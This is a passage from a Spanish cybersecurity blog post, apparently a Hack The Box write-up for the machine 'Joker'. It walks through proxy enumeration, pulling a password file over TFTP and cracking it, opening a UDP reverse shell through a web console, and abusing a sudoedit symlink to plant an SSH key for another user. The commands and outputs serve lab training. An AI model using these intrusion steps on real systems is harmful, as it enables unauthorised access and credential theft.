@@ -1,0 +1,822 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/piece.png">
+
+<title>Firtsmiracle Blog de Ciberseguridad</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Maquina Joker - htb writeup | Firtsmiracle blog de Ciberseguridad</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="Maquina Joker - htb writeup" />
+<meta name="author" content="Firtsmiracle" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="El dia de hoy vamos a resolver Joker de hackthebox una maquina linux de dificultad hard. Para poder comprometer esta maquina realizaremos la enumeración de un squid proxy a traves del servicio tftp del protocolo udp, en donde obtenedremos unas credenciales que nos permitiran conectarnos a un servicio de consola donde podamos obtener ejecuciòn remota de comandos, evadiendo reglas iptables definidas; despues nos aprovecharemos de un privilegio de sudoers muy interesante para migrar a un usuario con mayores privilegios y finalmente veremos el riesgo de usar wildcards en tareas programadas que nos permitiran ganar acceso como el usuario root y obtener acceso total al sistema. Maquina bastante guapa asi que a darle!." />
+<meta property="og:description" content="El dia de hoy vamos a resolver Joker de hackthebox una maquina linux de dificultad hard. Para poder comprometer esta maquina realizaremos la enumeración de un squid proxy a traves del servicio tftp del protocolo udp, en donde obtenedremos unas credenciales que nos permitiran conectarnos a un servicio de consola donde podamos obtener ejecuciòn remota de comandos, evadiendo reglas iptables definidas; despues nos aprovecharemos de un privilegio de sudoers muy interesante para migrar a un usuario con mayores privilegios y finalmente veremos el riesgo de usar wildcards en tareas programadas que nos permitiran ganar acceso como el usuario root y obtener acceso total al sistema. Maquina bastante guapa asi que a darle!." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/htb-writeup-Joker" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/htb-writeup-Joker" />
+<meta property="og:site_name" content="Firtsmiracle blog de Ciberseguridad" />
+<meta property="og:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Joker/Joker.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-08-25T00:00:00+00:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Joker/Joker.png" />
+<meta property="twitter:title" content="Maquina Joker - htb writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Firtsmiracle"},"dateModified":"2023-08-25T00:00:00+00:00","datePublished":"2023-08-25T00:00:00+00:00","description":"El dia de hoy vamos a resolver Joker de hackthebox una maquina linux de dificultad hard. Para poder comprometer esta maquina realizaremos la enumeración de un squid proxy a traves del servicio tftp del protocolo udp, en donde obtenedremos unas credenciales que nos permitiran conectarnos a un servicio de consola donde podamos obtener ejecuciòn remota de comandos, evadiendo reglas iptables definidas; despues nos aprovecharemos de un privilegio de sudoers muy interesante para migrar a un usuario con mayores privilegios y finalmente veremos el riesgo de usar wildcards en tareas programadas que nos permitiran ganar acceso como el usuario root y obtener acceso total al sistema. Maquina bastante guapa asi que a darle!.","headline":"Maquina Joker - htb writeup","image":"http://localhost:4000/assets/images/HTB/htb-writeup-Joker/Joker.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/htb-writeup-Joker"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/piece.png"},"name":"Firtsmiracle"},"url":"http://localhost:4000/hackthebox/htb-writeup-Joker"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<!-- CSS -->
+<link href="/assets/css/prism.css" rel="stylesheet">
+<!-- SCSS can't be processed by browser, so we use .CSS to fix it -->
+<link href="/assets/css/theme.css" rel="stylesheet">
+<link href="/assets/css/modal.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h2>BLog de Ciberseguridad</h2><br><br>
+        <li><a href="/" id="menu-home">Inicio</a></li>
+        <li><a href="/categories#articulos">Artículos</a></li>
+        <li><a href="/categories#hackthebox" id="menu-hackthebox">HackTheBox</a></li>
+        <li><a href="/categories#novedades" id="menu-tryhackme">Novedades</a></li>
+        <li><a href="/tags">Tags</a></li>
+        <li><a href="/about" id="menu-aboutme">Información</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Buscar..."/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/piece.png" alt="Firtsmiracle blog de Ciberseguridad">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <script defer src="/assets/js/lightbox.js"></script>
+
+<div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">Maquina Joker - htb writeup</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/?s=250&d=mm&r=x" alt="">
+            
+        </div>            
+        <div>
+        Firtmiracle <a targ="_blank" class="text-info"></a> el 
+        <span class="post-date"><time class="post-date" datetime="2023-08-25">25 Aug 2023</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="/assets/images/HTB/htb-writeup-Joker/Joker.png" alt="Maquina Joker - htb writeup">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>El dia de hoy vamos a resolver <code>Joker</code> de <code>hackthebox</code> una maquina <code>linux</code> de dificultad hard. Para poder comprometer esta maquina realizaremos la enumeración de un <code>squid proxy</code> a traves del servicio <code>tftp</code> del protocolo <code>udp</code>, en donde obtenedremos unas credenciales que nos permitiran conectarnos a un servicio de consola donde podamos obtener ejecuciòn remota de comandos, evadiendo reglas <code>iptables</code> definidas; despues nos aprovecharemos de un privilegio de sudoers muy interesante para migrar a un usuario con mayores privilegios y finalmente veremos el riesgo de usar wildcards en tareas programadas que nos permitiran ganar acceso como el usuario <code>root</code> y obtener acceso total al sistema.</p>
+
+<p>Maquina bastante guapa asi que a darle!.</p>
+
+<p>Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina:</p>
+
+<pre><code class="language-bash">❯ mkdir Joker
+❯ ls
+
+ Joker
+</code></pre>
+<p>Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:</p>
+
+<pre><code class="language-bash">❯ which mkt
+mkt () {
+	mkdir {nmap,content,exploits,scripts}
+}
+❯ mkt
+❯ ls
+ content   exploits   nmap   scripts
+</code></pre>
+
+<h2 id="enumeracion">ENUMERACION <a href="#enumeracion">#</a></h2>
+
+<p>Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando <code>ping</code>:</p>
+
+<pre><code class="language-bash">❯ ping -c 1 10.10.10.21
+PING 10.10.10.21 (10.10.10.21) 56(84) bytes of data.
+64 bytes from 10.10.10.21: icmp_seq=1 ttl=63 time=106 ms
+
+--- 10.10.10.21 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 105.889/105.889/105.889/0.000 ms
+</code></pre>
+<p>Vemos que la maquina nos responde, con un ttl de <code>63</code> y por proximidad seria correspondiente a una maquina <code>linux</code>.</p>
+
+<h3 id="escaneo-de-puertos">ESCANEO DE PUERTOS</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="#enumeracion">-p-</a></td>
+      <td style="text-align: left">Escaneamos todos los 65535 puertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">–open</a></td>
+      <td style="text-align: left">Solo los puertos que estén abiertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-v</a></td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando (verbose).</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-oG</a></td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para que mediante una funcion de <a href="https://s4vitar.github.io/">S4vitar</a> nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre <code>openPorts</code>:</p>
+
+<pre><code class="language-java">❯ nmap -p- --open -sS --min-rate 5000 -vv -n -Pn 10.10.10.21 -oG openPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-25 23:25 GMT
+Initiating SYN Stealth Scan at 23:25
+Scanning 10.10.10.21 [65535 ports]
+Discovered open port 22/tcp on 10.10.10.21
+Discovered open port 3128/tcp on 10.10.10.21
+Completed SYN Stealth Scan at 23:25, 26.44s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.21
+Host is up, received user-set (0.12s latency).
+Scanned at 2023-08-25 23:25:26 GMT for 26s
+Not shown: 65533 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE    REASON
+22/tcp   open  ssh        syn-ack ttl 63
+3128/tcp open  squid-http syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 26.53 seconds
+           Raw packets sent: 131087 (5.768MB) | Rcvd: 21 (924B)
+</code></pre>
+
+<h3 id="escaneo-de-version-y-servicios">ESCANEO DE VERSION Y SERVICIOS</h3>
+
+<pre><code class="language-java">❯ nmap -sCV -p22,3128 10.10.10.21 -oN targeted
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-25 23:26 GMT
+Nmap scan report for 10.10.10.21
+Host is up (0.13s latency).
+
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 7.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 88:24:e3:57:10:9f:1b:17:3d:7a:f3:26:3d:b6:33:4e (RSA)
+|   256 76:b6:f6:08:00:bd:68:ce:97:cb:08:e7:77:69:3d:8a (ECDSA)
+|_  256 dc:91:e4:8d:d0:16:ce:cf:3d:91:82:09:23:a7:dc:86 (ED25519)
+3128/tcp open  http-proxy Squid http proxy 3.5.12
+|_http-title: ERROR: The requested URL could not be retrieved
+|_http-server-header: squid/3.5.12
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.63 seconds
+</code></pre>
+
+<p>Visulizamos información interesante de los puertos escaneados:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th>Servicio</th>
+      <th>Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22</td>
+      <td>SSH</td>
+      <td>OpenSSH 7.3p1 Ubuntu 1ubuntu0.1</td>
+    </tr>
+    <tr>
+      <td>3128</td>
+      <td>SQUID-HTTP</td>
+      <td>http-proxy Squid</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="explotacion">EXPLOTACION <a href="#explotacion">#</a></h2>
+
+<p>Comenzamos abriendo nuestro navegador y observamos el servicio correspondiente al puerto <code>3128</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Joker/joker1.PNG" alt="" /></p>
+
+<p>Como vemos que se trata de un <code>squid proxy</code> podemos apoyarnos de nuestra extensión <code>foxy proxy</code> para agregar el proxy correspondiente a la maquina victima y asi intentar ver si al pasar con este nos muestra un contenido distinto.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Joker/joker2.PNG" alt="" /></p>
+
+<p>Vemos que aun no podemos visualizar el contenido y que el servicio se queda cargando sin responder.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Joker/joker3.PNG" alt="" /></p>
+
+<p>Ahora como vemos que se encuentra activo el <code>squid proxy</code> podemos intentar pasar a traves de este y intentar descubrir puertos internos de la maquina con la ayuda de <code>wfuzz</code>.</p>
+
+<pre><code class="language-bash">❯ wfuzz -c --hc=404 -t 20 --hh=3576 --hw=400 -z range,0-65535 -p 10.10.10.21:3128:HTTP -u http://localhost:FUZZ
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://localhost:FUZZ/
+Total requests: 65536
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                               
+=====================================================================
+
+000000001:   400        151 L    416 W      3550 Ch     "0"                                                                                                                   
+000000022:   407        144 L    393 W      3590 Ch     "21"                                                                                                                  
+000000071:   407        144 L    393 W      3590 Ch     "70"                                                                                                                  
+000000211:   407        144 L    393 W      3594 Ch     "210"                                                                                                                 
+000000281:   407        144 L    393 W      3594 Ch     "280"                                                                                                                 
+000000489:   407        144 L    393 W      3594 Ch     "488"                                                                                                                 
+000000444:   407        144 L    393 W      3594 Ch     "443"                                                                                                                 
+000000592:   407        144 L    393 W      3594 Ch     "591"                                                                                                                 
+000000778:   407        144 L    393 W      3594 Ch     "777"
+</code></pre>
+
+<p>La herramienta nos reporta algunos posibles puertos que se encuentren activo de manera local, pero vimos que con <code>nmap</code> estos no se mostraban. Ahora si bien es cierto el puerto <code>21</code> no se encuentra externamente abierto, pero si consideramos los puertos por <code>UDP</code> tenemos al servicio <code>tftp</code> en el puerto <code>69</code>.</p>
+
+<p>Si ahora tratamos con <code>nmap</code> de enumerar el puerto 69 por <code>udp</code> este se encuentra en esta <code>filtered</code>.</p>
+
+<pre><code class="language-bash">❯ nmap -p69 -sU 10.10.10.21 -n -v
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-25 23:44 GMT
+Initiating Ping Scan at 23:44
+Scanning 10.10.10.21 [4 ports]
+Completed Ping Scan at 23:44, 0.12s elapsed (1 total hosts)
+Initiating UDP Scan at 23:44
+Scanning 10.10.10.21 [1 port]
+Completed UDP Scan at 23:44, 1.09s elapsed (1 total ports)
+Nmap scan report for 10.10.10.21
+Host is up (0.11s latency).
+
+PORT   STATE         SERVICE
+69/udp open|filtered tftp
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 1.34 seconds
+           Raw packets sent: 6 (246B) | Rcvd: 4 (162B)
+</code></pre>
+
+<p>Probamos a conectarnos al servicio y al intentar extraer alguna información nos responde con un mensjae de violación.</p>
+
+<pre><code class="language-bash">❯ tftp 10.10.10.21
+tftp&gt; get /etc/passwd
+Error code 2: Access violation
+tftp&gt; get /etc/
+Error code 2: Access violation
+tftp&gt;
+</code></pre>
+
+<p>Como ya previamente sabemos que se esta ejecutando el servicio de <code>squid proxy</code>, podemos intentar traernos el archivo de configuración, que por defecto se encuentra en la ruta
+<code>/etc/squid/squid.conf</code>.</p>
+
+<pre><code class="language-bash">❯ tftp 10.10.10.21
+tftp&gt; get /etc/squid/squid.conf
+Received 295428 bytes in 66.4 seconds
+tftp&gt;
+</code></pre>
+
+<p>Conseguimos traernos el archivo y si ahora lo cateamos vemos un contenido interesante.</p>
+
+<pre><code class="language-bash">❯ ls
+ squid.conf
+❯ /bin/cat squid.conf | grep -v "^#" | sed '/^\s*$/d'
+acl SSL_ports port 443
+acl Safe_ports port 80		# http
+acl Safe_ports port 21		# ftp
+acl Safe_ports port 443		# https
+acl Safe_ports port 70		# gopher
+acl Safe_ports port 210		# wais
+acl Safe_ports port 1025-65535	# unregistered ports
+acl Safe_ports port 280		# http-mgmt
+acl Safe_ports port 488		# gss-http
+acl Safe_ports port 591		# filemaker
+acl Safe_ports port 777		# multiling http
+acl CONNECT method CONNECT
+http_access deny !Safe_ports
+http_access deny CONNECT !SSL_ports
+http_access deny manager
+auth_param basic program /usr/lib/squid/basic_ncsa_auth /etc/squid/passwords
+auth_param basic realm kalamari
+acl authenticated proxy_auth REQUIRED
+http_access allow authenticated
+http_access deny all
+http_port 3128
+coredump_dir /var/spool/squid
+refresh_pattern ^ftp:		1440	20%	10080
+refresh_pattern ^gopher:	1440	0%	1440
+refresh_pattern -i (/cgi-bin/|\?) 0	0%	0
+refresh_pattern (Release|Packages(.gz)*)$      0       20%     2880
+refresh_pattern .		0	20%	4320
+</code></pre>
+
+<p>Podemos observar una ruta que contiene contraseñas, asi que vamos a proceder a traernos el archivo y obtenemos unas credenciales hasheadas.</p>
+
+<pre><code class="language-bash">❯ tftp 10.10.10.21
+tftp&gt; get /etc/squid/passwords
+Received 48 bytes in 0.1 seconds
+❯ /bin/cat passwords
+kalamari:$apr1$zyzBxQYW$pL360IoLQ5Yum5SLTph.l0
+</code></pre>
+
+<p>Vamos a proceder a crackearlas con <code>john</code> y obtenemos unas credenciales validas <code>kalamari:ihateseafood</code></p>
+
+<pre><code class="language-bash">❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
+Use the "--format=md5crypt-long" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 512/512 AVX512BW 16x3])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+ihateseafood     (kalamari)
+1g 0:00:00:19 DONE (2023-08-25 23:57) 0.05173g/s 378636p/s 378636c/s 378636C/s ihateyou456!..ihatepz
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+</code></pre>
+
+<p>Ya que contamos con credenciales validas, podemos usarlas para el proxy que anteriormente agregamos.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Joker/joker4.PNG" alt="" /></p>
+
+<p>Como ahora estamos pasando correctamente por el proxy, podemos enumerar los servicios de la maquina victima como si estuvieramos localmente.</p>
+
+<p>Si accedemos a nuestra ip local, vemos que en el puerto 80 hay un contenido diferente que corresponde a <code>shorty url</code></p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Joker/joker5.PNG" alt="" /></p>
+
+<p>Ya que estamos en otro servicio, podemos enumerar rutas disponibles y esta vez emplearemos <code>gobuster</code> para hacerlo.</p>
+
+<pre><code class="language-bash">❯ gobuster dir -t 150 -u http://127.0.0.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --proxy http://kalamari:ihateseafood@10.10.10.21:3128
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://127.0.0.1
+[+] Method:                  GET
+[+] Threads:                 150
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] Proxy:                   http://kalamari:ihateseafood@10.10.10.21:3128
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2023/08/26 00:11:32 Starting gobuster in directory enumeration mode
+===============================================================
+/list                 (Status: 301) [Size: 251] [--&gt; http://127.0.0.1/list/]
+/console              (Status: 200) [Size: 1479]
+</code></pre>
+
+<p>Encontramos la ruta console y si vemos el contenido, tenemos acceso a una consola interactiva.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Joker/joker6.PNG" alt="" /></p>
+
+<p>Si interactuamos vemos que podemos ejecutar comandos.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Joker/joker7.PNG" alt="" /></p>
+
+<p>Si queremos enviarnos una conexión a nuestra maquina usando <code>nc</code> no tenemos exito, pero si visualizamos las reglas de conexión permitidas, observamos que solo estan permitidas las conexiones por <code>tcp</code> del puerto 22 y 3128 y al contrario por <code>udp</code> todas las conexiones estan permitidas.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Joker/joker8.PNG" alt="" /></p>
+
+<pre><code class="language-bash">'# Generated by iptables-save v1.6.0 on Fri May 19 18:01:16 2017
+*filter
+:INPUT DROP [41573:1829596]
+:FORWARD ACCEPT [0:0]
+:OUTPUT ACCEPT [878:221932]
+-A INPUT -i ens33 -p tcp -m tcp --dport 22 -j ACCEPT
+-A INPUT -i ens33 -p tcp -m tcp --dport 3128 -j ACCEPT
+-A INPUT -i ens33 -p udp -j ACCEPT
+-A INPUT -i ens33 -p icmp -j ACCEPT
+-A INPUT -i lo -j ACCEPT
+-A OUTPUT -o ens33 -p tcp -m state --state NEW -j DROP
+COMMIT
+# Completed on Fri May 19 18:01:16 2017'  
+</code></pre>
+
+<p>Teniendo en cuenta que por <code>udp</code> todo esta permitido, vamos a mandarnos la conexión a traves de udp, solo debemos añadir el parametro <code>-u</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Joker/joker9.PNG" alt="" /></p>
+
+<p>Nos ponemos en escucha y recibimos la conexión.</p>
+
+<pre><code class="language-bash">❯ ncat -nlvp 443 -u
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.21.
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+werkzeug
+</code></pre>
+
+<p>Lo que sigue como de costumbre es obtener una tty full interactiva.</p>
+
+<pre><code class="language-bash">$ script /dev/null -c bash
+Script started, file is /dev/null
+werkzeug@joker:~$ ^Z     
+zsh: suspended  ncat -nlvp 443 -u
+❯ stty raw -echo; fg
+[1]  + continued  ncat -nlvp 443 -u
+                                   reset xterm
+werkzeug@joker:~$ export term=XTERM
+werkzeug@joker:~$ export shell=BASH
+werkzeug@joker:~$ stty rows 45 columns 184
+</code></pre>
+
+<p>Una vez en el sitema como el usuario <code>werkzeug</code>, vemos que tenemos asignado un permiso a nivel de sudoers donde podemos ejecutar el comando <code>sudoedit</code> como el usuario <code>alekos</code> sin proporcionar contraseña.</p>
+
+<pre><code class="language-bash">werkzeug@joker:~$ sudo -l
+Matching Defaults entries for werkzeug on joker:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, sudoedit_follow, !sudoedit_checkdir
+
+User werkzeug may run the following commands on joker:
+    (alekos) NOPASSWD: sudoedit /var/www/*/*/layout.html
+</code></pre>
+
+<p>Observamos que podemos ejecutar un archivo de nombre <code>layout.html</code> que se encuentra en cualquier directorio dentro de la ruta <code>/var/www/*</code></p>
+
+<pre><code class="language-bash">werkzeug@joker:~$ ls -l
+total 12
+-rwxr-x--- 1 root     werkzeug  581 May 18  2017 manage-shorty.py
+drwxr-x--- 5 root     werkzeug 4096 May 18  2017 shorty
+drwxr-xr-x 2 werkzeug werkzeug 4096 May 18  2017 testing
+werkzeug@joker:~$ cd testing/
+werkzeug@joker:~/testing$ ls
+layout.html
+</code></pre>
+
+<p>Vemos que dentro del directorio testing se encuentra un archivo <code>layout.html</code>, pero segun el privilegio que tenemos asignado el archivo <code>layout.html</code> debe encontrarse dentro de dos subdirectorios cualquiera.</p>
+
+<p>Y dado que tenemos permiso de escritura en <code>testing</code>, podemos crear dentro de este otro directorio y dentro el archivo <code>layout.html</code>.</p>
+
+<pre><code class="language-bash">werkzeug@joker:~$ cd testing/
+werkzeug@joker:~/testing$ mkdir test
+werkzeug@joker:~/testing$ cd !$
+cd test
+werkzeug@joker:~/testing/test$ touch layout.html
+</code></pre>
+
+<p>Si ahora usamos el comando <code>sudoedit</code> vemos que no nos pide proporcionar contraseña.</p>
+
+<pre><code class="language-bash">werkzeug@joker:~/testing/test$ sudoedit -u alekos /var/www/testing/test/layout.html 
+Unable to create directory /var/www/.nano: Permission denied
+It is required for saving/loading search history or cursor positions.
+
+Press Enter to continue
+</code></pre>
+
+<p>Al ver esto, lo que podemos tratar de hacer es aprovecharnos de este permiso y aprovecharnos del principio basico de claves rsa, mediante el cual al creemos el archivo <code>layout.html</code> y que este sea un link simbolico a <code>/home/alekos/.ssh/authorized_keys</code>, donde al insertar nuestra clave publica como <code>authorized_keys</code>, podamos conectarnos sin necesidad de proporcionar una contraseña y al poder editar este archivo como el usuario <code>alekos</code> sera este el que ejecute la acción.</p>
+
+<p>De este modo sera como si estuvieramos insertando nuestra clave publica mediante el archivo layout.html a el directorio <code>.ssh</code> del usuario alekos.</p>
+
+<pre><code class="language-bash">werkzeug@joker:~/testing/test$ ln -s -f /home/alekos/.ssh/authorized_keys layout.html 
+werkzeug@joker:~/testing/test$ sudoedit -u alekos /var/www/testing/test/layout.html 
+Unable to create directory /var/www/.nano: Permission denied
+It is required for saving/loading search history or cursor positions.
+
+Press Enter to continue
+
+werkzeug@joker:~/testing/test$ cat layout.html 
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDYvqYRwqRrHydQfmmP56U9Wkec5IS2odMcoFxXppd5IPdzzf6CIv3skuKorlyi8HZCbsHnhm57Fqzn3PZWZ7pp5rgFzTPneh4a4W7NJONRxsuRwT4SWWNzmSjINyQrWurhctekrh3rRuhDwtSIz9rTjFKNCsmTbk6Qm3Fx3+JfYuKhuq4lNwSo3QqU2+yNv+svzzs66sdq+E/2Z0bhoi5bubhwj5g739A5odh57Hey9AfNtsK9vcVOpL+yH9RAwNHfRSHxM8GJrInMc3Twb9a8FQ8MSNO7gXd2+ykRqP0L8TkNJMggNTpmCZctL7a1wJHbTjcj68JO9nmFJgyh0BZQ8wlQetcDgo0yQ3jIhoIvN7GzPyJbo5X3cFhw/2gXSxWVLRwk6e7RQELp2SZeEFXN6ycimU4tbWEOrexJO2VwZQp8ZWv46ffUj4c4jYAiZ81i3wVJoko0uLcE9KENb/0E+9dnx5uMLUDNXz8x9EFwOkN1qxD3skGtR3dXMFZFRKM= root@fmiracle
+</code></pre>
+
+<p>De este modo ahora podemos conectarnos como el usuario <code>alekos</code>.</p>
+
+<pre><code class="language-bash">❯ ssh alekos@10.10.10.21
+The authenticity of host '10.10.10.21 (10.10.10.21)' can't be established.
+ECDSA key fingerprint is SHA256:1yj4blzJwO5TYIZYFB3HMwXEqeflHc2iF1Idp3lZ94k.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.21' (ECDSA) to the list of known hosts.
+Welcome to Ubuntu 16.10 (GNU/Linux 4.8.0-52-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+0 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Sat May 20 16:38:08 2017 from 10.10.13.210
+alekos@joker:~$
+</code></pre>
+
+<p>Ahora podemos dirigirnos a su directorio personal y visualizar la primera flag <code>user.txt</code>.</p>
+
+<pre><code class="language-bash">alekos@joker:~$ ls
+backup  development  user.txt
+alekos@joker:~$ cat user.txt 
+fcbfa16ff0623562479c4a6a7e4897ba
+</code></pre>
+
+<h2 id="elevacion-de-privilegios">ELEVACION DE PRIVILEGIOS <a href="#elevacion-de-privilegios">#</a></h2>
+
+<p>Listando el contenido del directorio de <code>alekos</code>, vemos dos directorio uno de <code>development</code> el cual contiene scripts en <code>python</code> y el directorio <code>backup</code> el cual contiene archivos comprimidos con <code>tar</code>.</p>
+
+<pre><code class="language-bash">alekos@joker:~$ ls
+backup  development  user.txt
+alekos@joker:~$ cd development/
+alekos@joker:~/development$ ls
+__init__.py  application.py  data  models.py  static  templates  utils.py  views.py
+alekos@joker:~/development$ cd ..
+alekos@joker:~$ cd backup/
+alekos@joker:~/backup$ ls
+dev-1514134201.tar.gz  dev-1693005901.tar.gz  dev-1693006801.tar.gz  dev-1693007701.tar.gz  dev-1693008601.tar.gz  dev-1693009501.tar.gz  dev-1693010402.tar.gz
+dev-1514134501.tar.gz  dev-1693006201.tar.gz  dev-1693007101.tar.gz  dev-1693008001.tar.gz  dev-1693008902.tar.gz  dev-1693009801.tar.gz  dev-1693010701.tar.gz
